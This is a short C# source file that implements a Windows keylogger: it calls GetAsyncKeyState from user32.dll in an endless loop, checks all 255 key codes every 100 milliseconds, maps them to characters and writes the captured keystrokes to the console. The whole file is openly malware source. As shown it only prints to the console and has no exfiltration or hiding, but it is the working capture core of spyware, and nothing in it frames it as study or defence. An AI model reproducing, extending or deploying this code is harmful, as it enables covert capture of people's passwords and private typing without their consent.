using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger2 {
    public class KeyLogger {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static Dictionary<Keys, string> keys = new Dictionary<Keys, string>() {
            { Keys.Space, " " },
            { Keys.Enter, "\n" },
            { Keys.OemPeriod, "." },
            { Keys.OemMinus, "-" },
            { Keys.OemOpenBrackets, "(" },
            { Keys.OemCloseBrackets, ")" },
            { Keys.Back, "| <- |" },
            { Keys.D0, "0" },
            { Keys.D1, "1" },
            { Keys.D2, "2" },
            { Keys.D3, "3" },
            { Keys.D4, "4" },
            { Keys.D5, "5" },
            { Keys.D6, "6" },
            { Keys.D7, "7" },
            { Keys.D8, "8" },
            { Keys.D9, "9" },
            { Keys.NumPad0, "0" },
            { Keys.NumPad1, "1" },
            { Keys.NumPad2, "2" },
            { Keys.NumPad3, "3" },
            { Keys.NumPad4, "4" },
            { Keys.NumPad5, "5" },
            { Keys.NumPad6, "6" },
            { Keys.NumPad7, "7" },
            { Keys.NumPad8, "8" },
            { Keys.NumPad9, "9" }
        };
        private static String FormatString(int i) {
            if (keys.ContainsKey((Keys) i)) {
                return keys[(Keys) i];
            }
            String s = ((Keys) i).ToString();
            return (s.Length == 1) ? s : "";
        }

        public static void Run() {
            while (true) {
                Thread.Sleep(100);
                int lastState = 0;
                for (int i = 0; i < 255; i++) {
                    int state = GetAsyncKeyState(i);
                    if (state != 0) {
                        Console.Write(FormatString(i));
                    }
                }
            }    
        }
    }
}